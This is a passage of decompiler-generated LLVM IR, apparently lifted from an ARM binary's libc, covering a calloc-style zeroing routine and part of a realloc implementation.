  br i1 %v2_129b0, label %dec_label_pc_129f8, label %dec_label_pc_129c8

dec_label_pc_129c8:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_129d0 = udiv i32 %v2_129c0, %arg1
  %v9_129d4 = icmp eq i32 %v2_129d0, %arg2
  br i1 %v9_129d4, label %dec_label_pc_129f8, label %dec_label_pc_129dc

dec_label_pc_129dc:                               ; preds = %dec_label_pc_129c8
  %v0_129e0 = call i32 @__aeabi_read_tp()
  %v3_129e4 = load i16, i16* @global_var_21d68.334, align 2
  %v4_129e4 = sext i16 %v3_129e4 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_129f0 = add i32 %v4_129e4, %v0_129e0
  %v4_129f0 = inttoptr i32 %v3_129f0 to i32*
  store i32 12, i32* %v4_129f0, align 4
  br label %dec_label_pc_12abc

dec_label_pc_129f8:                               ; preds = %dec_label_pc_129c8, %entry
  %v4_129fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 108) to i32*), align 4
  store i32 %v4_129fc, i32* @r4, align 4
  %v4_12a14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 112) to i32*), align 4
  store i32 %v4_12a14, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12a14)
  %v0_12a28 = load i32, i32* @r5, align 4
  %v2_12a28 = add i32 %v0_12a28, 16
  %v3_12a28 = inttoptr i32 %v2_12a28 to i32*
  %v4_12a28 = load i32, i32* %v3_12a28, align 4
  store i32 %v4_12a28, i32* %ip.global-to-local, align 4
  store i32 76340, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12a28)
  %v0_12a34 = load i32, i32* @r6, align 4
  store i32 %v0_12a34, i32* @r0, align 4
  %v0_12a38 = call i32 @malloc()
  store i32 %v0_12a38, i32* %r4.global-to-local, align 4
  %v2_12a3c = icmp eq i32 %v0_12a38, 0
  br i1 %v2_12a3c, label %.thread, label %dec_label_pc_12a44

dec_label_pc_12a44:                               ; preds = %dec_label_pc_129f8
  %v1_12a44 = add i32 %v0_12a38, -4
  %v2_12a44 = inttoptr i32 %v1_12a44 to i32*
  %v3_12a44 = load i32, i32* %v2_12a44, align 4
  %v1_12a48 = and i32 %v3_12a44, 2
  %v2_12a48 = icmp eq i32 %v1_12a48, 0
  br i1 %v2_12a48, label %dec_label_pc_12a50, label %.thread

dec_label_pc_12a50:                               ; preds = %dec_label_pc_12a44
  %v1_12a506 = add i32 %v3_12a44, -4
  %v1_12a54 = and i32 %v1_12a506, -4
  %v3_12a58 = udiv i32 %v1_12a54, 4
  store i32 %v3_12a58, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_12a54, 36
  %v2_12a60 = icmp ult i32 %v1_12a54, 33
  %v3_12a60 = or i1 %tmp, %v2_12a60
  br i1 %v3_12a60, label %dec_label_pc_12a6c, label %dec_label_pc_12a64

dec_label_pc_12a64:                               ; preds = %dec_label_pc_12a50
  %v3_12a64 = inttoptr i32 %v0_12a38 to i8*
  %v4_12a64 = call i32 @__GI_memset(i8* %v3_12a64, i32 0, i32 %v1_12a54)
  br label %.thread

dec_label_pc_12a6c:                               ; preds = %dec_label_pc_12a50
  %tmp7 = icmp eq i32 %v1_12a54, 16
  %v2_12a70 = inttoptr i32 %v0_12a38 to i32*
  store i32 0, i32* %v2_12a70, align 4
  %v1_12a74 = load i32, i32* %r4.global-to-local, align 4
  %v2_12a74 = add i32 %v1_12a74, 4
  %v3_12a74 = inttoptr i32 %v2_12a74 to i32*
  store i32 0, i32* %v3_12a74, align 4
  %v1_12a78 = load i32, i32* %r4.global-to-local, align 4
  %v2_12a78 = add i32 %v1_12a78, 8
  %v3_12a78 = inttoptr i32 %v2_12a78 to i32*
  store i32 0, i32* %v3_12a78, align 4
  %v2_12a7c = icmp ult i32 %v1_12a54, 13
  %v3_12a7c = or i1 %tmp7, %v2_12a7c
  br i1 %v3_12a7c, label %.thread, label %dec_label_pc_12a80

dec_label_pc_12a80:                               ; preds = %dec_label_pc_12a6c
  %v0_12a80 = load i32, i32* %ip.global-to-local, align 4
  %v1_12a84 = load i32, i32* %r4.global-to-local, align 4
  %v2_12a84 = add i32 %v1_12a84, 12
  %v3_12a84 = inttoptr i32 %v2_12a84 to i32*
  store i32 0, i32* %v3_12a84, align 4
  %v1_12a88 = load i32, i32* %r4.global-to-local, align 4
  %v2_12a88 = add i32 %v1_12a88, 16
  %v3_12a88 = inttoptr i32 %v2_12a88 to i32*
  store i32 0, i32* %v3_12a88, align 4
  %tmp8 = icmp ult i32 %v0_12a80, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_12a90

dec_label_pc_12a90:                               ; preds = %dec_label_pc_12a80
  %v0_12a90 = load i32, i32* %ip.global-to-local, align 4
  %v7_12a90 = icmp eq i32 %v0_12a90, 9
  %v1_12a94 = load i32, i32* %r4.global-to-local, align 4
  %v2_12a94 = add i32 %v1_12a94, 20
  %v3_12a94 = inttoptr i32 %v2_12a94 to i32*
  store i32 0, i32* %v3_12a94, align 4
  %v1_12a98 = load i32, i32* %r4.global-to-local, align 4
  %v2_12a98 = add i32 %v1_12a98, 24
  %v3_12a98 = inttoptr i32 %v2_12a98 to i32*
  store i32 0, i32* %v3_12a98, align 4
  br i1 %v7_12a90, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12a90
  %v2_12a9c = load i32, i32* %r4.global-to-local, align 4
  %v3_12a9c = add i32 %v2_12a9c, 32
  %v4_12a9c = inttoptr i32 %v3_12a9c to i32*
  store i32 0, i32* %v4_12a9c, align 4
  %v2_12aa0 = load i32, i32* %r4.global-to-local, align 4
  %v3_12aa0 = add i32 %v2_12aa0, 28
  %v4_12aa0 = inttoptr i32 %v3_12aa0 to i32*
  store i32 0, i32* %v4_12aa0, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12a90, %dec_label_pc_12a44, %dec_label_pc_12a80, %dec_label_pc_12a6c, %dec_label_pc_129f8, %dec_label_pc_12a64, %bb
  store i32 1, i32* @r1, align 4
  %v0_12ab0 = load i32, i32* @r5, align 4
  %v2_12ab0 = add i32 %v0_12ab0, 44
  %v3_12ab0 = inttoptr i32 %v2_12ab0 to i32*
  %v4_12ab0 = load i32, i32* %v3_12ab0, align 4
  store i32 %v4_12ab0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12ab0)
  br label %dec_label_pc_12abc

dec_label_pc_12abc:                               ; preds = %dec_label_pc_129dc, %.thread
  %v0_12abc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_129a8, i32* @r4, align 4
  store i32 %v6_129a8, i32* @r5, align 4
  store i32 %v9_129a8, i32* @r6, align 4
  store i32 %v12_129a8, i32* @lr, align 4
  ret i32 %v0_12abc

; uselistorder directives
  uselistorder i32 %v1_12a54, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_12a38, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12abc, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_12ad4(i32 %arg1) local_unnamed_addr {
dec_label_pc_12ad4:
  %v0_12ad4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ad4, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12ad4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12ad4, %bb
  %v4_12ae4 = phi i32 [ %arg1, %dec_label_pc_12ad4 ], [ 0, %bb ]
  ret i32 %v4_12ae4

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12ae8 = load i32, i32* @r4, align 4
  %v6_12ae8 = load i32, i32* @r5, align 4
  %v9_12ae8 = load i32, i32* @r6, align 4
  %v12_12ae8 = load i32, i32* @r7, align 4
  %v15_12ae8 = load i32, i32* @r8, align 4
  %v18_12ae8 = load i32, i32* @sb, align 4
  %v21_12ae8 = load i32, i32* @sl, align 4
  %v24_12ae8 = load i32, i32* @fp, align 4
  %v27_12ae8 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12af4 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_12af4, label %dec_label_pc_12b08, label %dec_label_pc_12b18

dec_label_pc_12b08:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_12b0c = call i32 @malloc()
  store i32 %v0_12b0c, i32* %r0.global-to-local, align 4
  store i32 %v0_12b0c, i32* @r4, align 4
  br label %dec_label_pc_12e78

dec_label_pc_12b18:                               ; preds = %entry
  %v2_12b18 = icmp eq i32 %arg2, 0
  br i1 %v2_12b18, label %dec_label_pc_12b20, label %dec_label_pc_12b2c

dec_label_pc_12b20:                               ; preds = %dec_label_pc_12b18
  %v0_12b20 = call i32 @free()
  store i32 %v0_12b20, i32* %r0.global-to-local, align 4
  %v0_12b24 = load i32, i32* @r6, align 4
  store i32 %v0_12b24, i32* @r4, align 4
  br label %dec_label_pc_12e78

dec_label_pc_12b2c:                               ; preds = %dec_label_pc_12b18
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_12b34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 108) to i32*), align 4
  store i32 %v4_12b34, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_12b34, i32* %r2.global-to-local, align 4
  %v4_12b40 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 68) to i32*), align 4
  store i32 %v4_12b40, i32* %r1.global-to-local, align 4
  %v2_12b44 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12b44, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12b4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12b4c)
  %v0_12b58 = load i32, i32* @r4, align 4
  store i32 %v0_12b58, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r1.global-to-local, align 4
  %v4_12b64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_12b70.439 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12b64)
  %v0_12b70 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_12b70, -32
  br i1 %tmp36, label %dec_label_pc_12b94, label %dec_label_pc_12b78

dec_label_pc_12b78:                               ; preds = %dec_label_pc_12b2c
  store i32 61920, i32* %r2.global-to-local, align 4
  %v0_12b7c = call i32 @__aeabi_read_tp()
  store i32 %v0_12b7c, i32* %r0.global-to-local, align 4
  %v3_12b80 = load i16, i16* @global_var_21d68.334, align 2
  %v4_12b80 = sext i16 %v3_12b80 to i32
  store i32 %v4_12b80, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_12b8c = add i32 %v4_12b80, %v0_12b7c
  %v4_12b8c = inttoptr i32 %v3_12b8c to i32*
  store i32 12, i32* %v4_12b8c, align 4
  br label %dec_label_pc_12e78

dec_label_pc_12b94:                               ; preds = %dec_label_pc_12b2c
  %v1_12b94 = add i32 %v0_12b70, 11
  store i32 %v1_12b94, i32* %r0.global-to-local, align 4
  %v0_12b98 = load i32, i32* @r5, align 4
  %v1_12b98 = add i32 %v0_12b98, -4
  %v2_12b98 = inttoptr i32 %v1_12b98 to i32*
  %v3_12b98 = load i32, i32* %v2_12b98, align 4
  store i32 %v3_12b98, i32* %r2.global-to-local, align 4
  %v2_12b9c = icmp ugt i32 %v1_12b94, 14
  %v7_12b9c = icmp eq i32 %v1_12b94, 15
  %v2_12ba0 = xor i1 %v2_12b9c, true
  %v3_12ba0 = or i1 %v7_12b9c, %v2_12ba0
  br i1 %v3_12ba0, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_12b94
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_12b94, %bb
  %v2_12ba4 = xor i1 %v7_12b9c, true
  %v3_12ba4 = and i1 %v2_12b9c, %v2_12ba4
  br i1 %v3_12ba4, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_12ba4 = and i32 %v1_12b94, -8
  store i32 %v5_12ba4, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_12ba8 = and i32 %v3_12b98, 2
  %v2_12ba8 = icmp eq i32 %v1_12ba8, 0
  %v1_12bac = add i32 %v0_12b98, -8
  store i32 %v1_12bac, i32* @sl, align 4
  %v1_12bb0 = and i32 %v3_12b98, -4
  store i32 %v1_12bb0, i32* @r6, align 4
  br i1 %v2_12ba8, label %dec_label_pc_12bb8, label %dec_label_pc_12d90

dec_label_pc_12bb8:                               ; preds = %bb29
  %v1_12bb8 = load i32, i32* @sb, align 4
  %v3_12bb8 = icmp ult i32 %v1_12bb0, %v1_12bb8
  br i1 %v3_12bb8, label %dec_label_pc_12bc4, label %bb30

bb30:                                             ; preds = %dec_label_pc_12bb8
  store i32 %v1_12bb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12d28

dec_label_pc_12bc4:                               ; preds = %dec_label_pc_12bb8
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12bcc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_12bcc, i32* %r0.global-to-local, align 4
  %v1_12bd0 = add i32 %v4_12bcc, 44
  %v2_12bd0 = inttoptr i32 %v1_12bd0 to i32*
  %v3_12bd0 = load i32, i32* %v2_12bd0, align 4
  store i32 %v3_12bd0, i32* %r3.global-to-local, align 4
  %v2_12bd4 = add i32 %v1_12bb0, %v1_12bac
  store i32 %v2_12bd4, i32* @r4, align 4
  %v9_12bd8 = icmp eq i32 %v2_12bd4, %v3_12bd0
  %v1_12bdc = add i32 %v2_12bd4, 4
  %v2_12bdc = inttoptr i32 %v1_12bdc to i32*
  %v3_12bdc = load i32, i32* %v2_12bdc, align 4
  store i32 %v3_12bdc, i32* %r1.global-to-local, align 4
  br i1 %v9_12bd8, label %dec_label_pc_12be4, label %dec_label_pc_12c20

dec_label_pc_12be4:                               ; preds = %dec_label_pc_12bc4
  %v1_12be4 = and i32 %v3_12bdc, -4
  %v2_12be8 = add i32 %v1_12be4, %v1_12bb0
  store i32 %v2_12be8, i32* %r1.global-to-local, align 4
  %v1_12bec = add i32 %v1_12bb8, 16
  store i32 %v1_12bec, i32* %r3.global-to-local, align 4
  %v3_12bf0 = icmp ult i32 %v2_12be8, %v1_12bec
  br i1 %v3_12bf0, label %dec_label_pc_12c74, label %dec_label_pc_12bf8

dec_label_pc_12bf8:                               ; preds = %dec_label_pc_12be4
  %v2_12bf8 = sub i32 %v2_12be8, %v1_12bb8
  %v1_12bfc = urem i32 %v3_12b98, 2
  %v2_12c00 = add i32 %v1_12bb8, %v1_12bac
  store i32 %v2_12c00, i32* %r1.global-to-local, align 4
  %v2_12c04 = or i32 %v1_12bb8, %v1_12bfc
  store i32 %v2_12c04, i32* %r2.global-to-local, align 4
  %v1_12c08 = or i32 %v2_12bf8, 1
  store i32 %v1_12c08, i32* %r3.global-to-local, align 4
  store i32 %v0_12b98, i32* @r4, align 4
  store i32 %v2_12c04, i32* %v2_12b98, align 4
  %v0_12c14 = load i32, i32* %r1.global-to-local, align 4
  %v1_12c14 = load i32, i32* %r0.global-to-local, align 4
  %v2_12c14 = add i32 %v1_12c14, 44
  %v3_12c14 = inttoptr i32 %v2_12c14 to i32*
  store i32 %v0_12c14, i32* %v3_12c14, align 4
  %v0_12c18 = load i32, i32* %r3.global-to-local, align 4
  %v1_12c18 = load i32, i32* %r1.global-to-local, align 4
  %v2_12c18 = add i32 %v1_12c18, 4
  %v3_12c18 = inttoptr i32 %v2_12c18 to i32*
  store i32 %v0_12c18, i32* %v3_12c18, align 4
  br label %dec_label_pc_12e5c

dec_label_pc_12c20:                               ; preds = %dec_label_pc_12bc4
  %v1_12c20 = and i32 %v3_12bdc, -2
  %v2_12c24 = add i32 %v1_12c20, %v2_12bd4
  store i32 %v2_12c24, i32* %r3.global-to-local, align 4
  %v1_12c28 = add i32 %v2_12c24, 4
  %v2_12c28 = inttoptr i32 %v1_12c28 to i32*
  %v3_12c28 = load i32, i32* %v2_12c28, align 4
  store i32 %v3_12c28, i32* %r3.global-to-local, align 4
  %v1_12c2c = urem i32 %v3_12c28, 2
  %v2_12c2c = icmp eq i32 %v1_12c2c, 0
  br i1 %v2_12c2c, label %dec_label_pc_12c34, label %dec_label_pc_12c74

dec_label_pc_12c34:                               ; preds = %dec_label_pc_12c20
  %v1_12c34 = and i32 %v3_12bdc, -4
  store i32 %v1_12c34, i32* %r3.global-to-local, align 4
  %v2_12c38 = add i32 %v1_12c34, %v1_12bb0
  store i32 %v2_12c38, i32* %r0.global-to-local, align 4
  %v3_12c3c = icmp ult i32 %v2_12c38, %v1_12bb8
  br i1 %v3_12c3c, label %dec_label_pc_12c74, label %dec_label_pc_12c44

dec_label_pc_12c44:                               ; preds = %dec_label_pc_12c34
  %v1_12c44 = add i32 %v1_12bb0, %v0_12b98
  %v2_12c44 = inttoptr i32 %v1_12c44 to i32*
  %v3_12c44 = load i32, i32* %v2_12c44, align 4
  store i32 %v3_12c44, i32* %r1.global-to-local, align 4
  %v1_12c48 = add i32 %v3_12c44, 12
  %v2_12c48 = inttoptr i32 %v1_12c48 to i32*
  %v3_12c48 = load i32, i32* %v2_12c48, align 4
  store i32 %v3_12c48, i32* %r3.global-to-local, align 4
  %v9_12c4c = icmp eq i32 %v3_12c48, %v2_12bd4
  %v1_12c50 = add i32 %v2_12bd4, 12
  %v2_12c50 = inttoptr i32 %v1_12c50 to i32*
  %v3_12c50 = load i32, i32* %v2_12c50, align 4
  store i32 %v3_12c50, i32* %r2.global-to-local, align 4
  br i1 %v9_12c4c, label %dec_label_pc_12c58, label %dec_label_pc_12c64

dec_label_pc_12c58:                               ; preds = %dec_label_pc_12c44
  %v1_12c58 = add i32 %v3_12c50, 8
  %v2_12c58 = inttoptr i32 %v1_12c58 to i32*
  %v3_12c58 = load i32, i32* %v2_12c58, align 4
  store i32 %v3_12c58, i32* %r3.global-to-local, align 4
  %v9_12c5c = icmp eq i32 %v3_12c58, %v2_12bd4
  br i1 %v9_12c5c, label %dec_label_pc_12c68, label %dec_label_pc_12c64

dec_label_pc_12c64:                               ; preds = %dec_label_pc_12c44, %dec_label_pc_12c58
  %v0_12c64 = call i32 @abort()
  store i32 %v0_12c64, i32* %r0.global-to-local, align 4
  %v0_12c68.pre = load i32, i32* @r1, align 4
  %v1_12c68.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12c68

dec_label_pc_12c68:                               ; preds = %dec_label_pc_12c58, %dec_label_pc_12c64
  %v1_12c68 = phi i32 [ %v3_12c50, %dec_label_pc_12c58 ], [ %v1_12c68.pre, %dec_label_pc_12c64 ]
  %v0_12c68 = phi i32 [ %v3_12c44, %dec_label_pc_12c58 ], [ %v0_12c68.pre, %dec_label_pc_12c64 ]
  %v2_12c68 = add i32 %v1_12c68, 8
  %v3_12c68 = inttoptr i32 %v2_12c68 to i32*
  store i32 %v0_12c68, i32* %v3_12c68, align 4
  %v0_12c6c = load i32, i32* %r2.global-to-local, align 4
  %v1_12c6c = load i32, i32* %r1.global-to-local, align 4
  %v2_12c6c = add i32 %v1_12c6c, 12
  %v3_12c6c = inttoptr i32 %v2_12c6c to i32*
  store i32 %v0_12c6c, i32* %v3_12c6c, align 4
  %v1_12d28.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12d28

dec_label_pc_12c74:                               ; preds = %dec_label_pc_12be4, %dec_label_pc_12c34, %dec_label_pc_12c20
  %v1_12c74 = add i32 %v1_12bb8, -7
  store i32 %v1_12c74, i32* @r0, align 4
  %v0_12c78 = call i32 @malloc()
  store i32 %v0_12c78, i32* @r0, align 4
  store i32 %v0_12c78, i32* %r1.global-to-local, align 4
  %v2_12c7c = icmp eq i32 %v0_12c78, 0
  br i1 %v2_12c7c, label %bb31, label %dec_label_pc_12c88

bb31:                                             ; preds = %dec_label_pc_12c74
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12e5c

dec_label_pc_12c88:                               ; preds = %dec_label_pc_12c74
  %v1_12c90.pre = load i32, i32* @r4, align 4
  %v1_12c88 = add i32 %v0_12c78, -4
  %v2_12c88 = inttoptr i32 %v1_12c88 to i32*
  %v3_12c88 = load i32, i32* %v2_12c88, align 4
  store i32 %v3_12c88, i32* @r3, align 4
  %v1_12c8c = add i32 %v0_12c78, -8
  store i32 %v1_12c8c, i32* @r7, align 4
  %v9_12c90 = icmp eq i32 %v1_12c8c, %v1_12c90.pre
  br i1 %v9_12c90, label %.thread2, label %dec_label_pc_12ca0

.thread2:                                         ; preds = %dec_label_pc_12c88
  %v2_12c94 = and i32 %v3_12c88, -4
  store i32 %v2_12c94, i32* %r3.global-to-local, align 4
  %v2_12c98 = load i32, i32* @r6, align 4
  %v3_12c98 = add i32 %v2_12c98, %v2_12c94
  store i32 %v3_12c98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12d28

dec_label_pc_12ca0:                               ; preds = %dec_label_pc_12c88
  %v0_12ca0 = load i32, i32* @r6, align 4
  %v1_12ca0 = add i32 %v0_12ca0, -4
  store i32 %v1_12ca0, i32* @r2, align 4
  %v3_12ca4 = udiv i32 %v1_12ca0, 4
  store i32 %v3_12ca4, i32* @ip, align 4
  %tmp37 = and i32 %v1_12ca0, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_12cac = icmp ult i32 %v1_12ca0, 36
  %v3_12cac = or i1 %tmp38, %v2_12cac
  %v0_12cbc = load i32, i32* @r5, align 4
  br i1 %v3_12cac, label %dec_label_pc_12cbc, label %dec_label_pc_12cb0

dec_label_pc_12cb0:                               ; preds = %dec_label_pc_12ca0
  store i32 %v0_12cbc, i32* @r1, align 4
  %v0_12cb4 = call i32 @memcpy()
  store i32 %v0_12cb4, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12ca0
  %v1_12cbc = inttoptr i32 %v0_12cbc to i32*
  %v2_12cbc = load i32, i32* %v1_12cbc, align 4
  store i32 %v2_12cbc, i32* %r3.global-to-local, align 4
  %v2_12cc0 = inttoptr i32 %v0_12c78 to i32*
  store i32 %v2_12cbc, i32* %v2_12cc0, align 4
  %v0_12cc4 = load i32, i32* @r5, align 4
  %v1_12cc4 = add i32 %v0_12cc4, 4
  %v2_12cc4 = inttoptr i32 %v1_12cc4 to i32*
  %v3_12cc4 = load i32, i32* %v2_12cc4, align 4
  store i32 %v3_12cc4, i32* %r3.global-to-local, align 4
  %v1_12cc8 = load i32, i32* %r1.global-to-local, align 4
  %v2_12cc8 = add i32 %v1_12cc8, 4
  %v3_12cc8 = inttoptr i32 %v2_12cc8 to i32*
  store i32 %v3_12cc4, i32* %v3_12cc8, align 4
  %v0_12ccc = load i32, i32* @r5, align 4
  %v1_12ccc = add i32 %v0_12ccc, 8
  %v2_12ccc = inttoptr i32 %v1_12ccc to i32*
  %v3_12ccc = load i32, i32* %v2_12ccc, align 4
  store i32 %v3_12ccc, i32* %r3.global-to-local, align 4
  %v0_12cd0 = load i32, i32* @ip, align 4
  %v1_12cd4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12cd4 = add i32 %v1_12cd4, 8
  %v3_12cd4 = inttoptr i32 %v2_12cd4 to i32*
  store i32 %v3_12ccc, i32* %v3_12cd4, align 4
  %tmp39 = icmp ult i32 %v0_12cd0, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_12cdc

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12cbc
  %v0_12cdc = load i32, i32* @r5, align 4
  %v1_12cdc = add i32 %v0_12cdc, 12
  %v2_12cdc = inttoptr i32 %v1_12cdc to i32*
  %v3_12cdc = load i32, i32* %v2_12cdc, align 4
  store i32 %v3_12cdc, i32* %r3.global-to-local, align 4
  %v1_12ce0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12ce0 = add i32 %v1_12ce0, 12
  %v3_12ce0 = inttoptr i32 %v2_12ce0 to i32*
  store i32 %v3_12cdc, i32* %v3_12ce0, align 4
  %v0_12ce4 = load i32, i32* @r5, align 4
  %v1_12ce4 = add i32 %v0_12ce4, 16
  %v2_12ce4 = inttoptr i32 %v1_12ce4 to i32*
  %v3_12ce4 = load i32, i32* %v2_12ce4, align 4
  store i32 %v3_12ce4, i32* %r3.global-to-local, align 4
  %v0_12ce8 = load i32, i32* @ip, align 4
  %v1_12cec = load i32, i32* %r1.global-to-local, align 4
  %v2_12cec = add i32 %v1_12cec, 16
  %v3_12cec = inttoptr i32 %v2_12cec to i32*
  store i32 %v3_12ce4, i32* %v3_12cec, align 4
  %tmp40 = icmp ult i32 %v0_12ce8, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_12cf4

dec_label_pc_12cf4:                               ; preds = %dec_label_pc_12cdc
  %v0_12cf4 = load i32, i32* @r5, align 4
  %v1_12cf4 = add i32 %v0_12cf4, 20
  %v2_12cf4 = inttoptr i32 %v1_12cf4 to i32*
  %v3_12cf4 = load i32, i32* %v2_12cf4, align 4
  store i32 %v3_12cf4, i32* %r3.global-to-local, align 4
  %v1_12cf8 = load i32, i32* %r1.global-to-local, align 4
  %v2_12cf8 = add i32 %v1_12cf8, 20
  %v3_12cf8 = inttoptr i32 %v2_12cf8 to i32*
  store i32 %v3_12cf4, i32* %v3_12cf8, align 4
  %v0_12cfc = load i32, i32* @r5, align 4
  %v1_12cfc = add i32 %v0_12cfc, 24
  %v2_12cfc = inttoptr i32 %v1_12cfc to i32*
  %v3_12cfc = load i32, i32* %v2_12cfc, align 4
  store i32 %v3_12cfc, i32* %r3.global-to-local, align 4
  %v1_12d00 = load i32, i32* %r1.global-to-local, align 4
  %v2_12d00 = add i32 %v1_12d00, 24
  %v3_12d00 = inttoptr i32 %v2_12d00 to i32*
  store i32 %v3_12cfc, i32* %v3_12d00, align 4
  %v0_12d04 = load i32, i32* @ip, align 4
  %v7_12d04 = icmp eq i32 %v0_12d04, 9
  br i1 %v7_12d04, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_12cf4
  %v1_12d08 = load i32, i32* @r5, align 4
  %v2_12d08 = add i32 %v1_12d08, 28
  %v3_12d08 = inttoptr i32 %v2_12d08 to i32*
  %v4_12d08 = load i32, i32* %v3_12d08, align 4
  store i32 %v4_12d08, i32* %r3.global-to-local, align 4
  %v2_12d0c = load i32, i32* %r1.global-to-local, align 4
  %v3_12d0c = add i32 %v2_12d0c, 28
  %v4_12d0c = inttoptr i32 %v3_12d0c to i32*
  store i32 %v4_12d08, i32* %v4_12d0c, align 4
  %v1_12d10 = load i32, i32* @r5, align 4
  %v2_12d10 = add i32 %v1_12d10, 32
  %v3_12d10 = inttoptr i32 %v2_12d10 to i32*
  %v4_12d10 = load i32, i32* %v3_12d10, align 4
  store i32 %v4_12d10, i32* %r3.global-to-local, align 4
  %v2_12d14 = load i32, i32* %r1.global-to-local, align 4
  %v3_12d14 = add i32 %v2_12d14, 32
  %v4_12d14 = inttoptr i32 %v3_12d14 to i32*
  store i32 %v4_12d10, i32* %v4_12d14, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_12cf4, %dec_label_pc_12cdc, %dec_label_pc_12cbc, %dec_label_pc_12cb0, %bb32
  %v0_12d18 = load i32, i32* @r5, align 4
  store i32 %v0_12d18, i32* @r0, align 4
  %v0_12d1c = call i32 @free()
  store i32 %v0_12d1c, i32* %r0.global-to-local, align 4
  %v0_12d20 = load i32, i32* @r7, align 4
  %v1_12d20 = add i32 %v0_12d20, 8
  store i32 %v1_12d20, i32* @r4, align 4
  br label %dec_label_pc_12e5c

dec_label_pc_12d28:                               ; preds = %bb30, %.thread2, %dec_label_pc_12c68
  %v0_12d3c = phi i32 [ %v3_12c98, %.thread2 ], [ %v1_12bb0, %bb30 ], [ %v1_12d28.pre, %dec_label_pc_12c68 ]
  %v0_12d28 = load i32, i32* @sb, align 4
  %v2_12d28 = sub i32 %v0_12d3c, %v0_12d28
  store i32 %v2_12d28, i32* %r1.global-to-local, align 4
  %v0_12d30 = load i32, i32* @sl, align 4
  %v1_12d30 = add i32 %v0_12d30, 4
  %v2_12d30 = inttoptr i32 %v1_12d30 to i32*
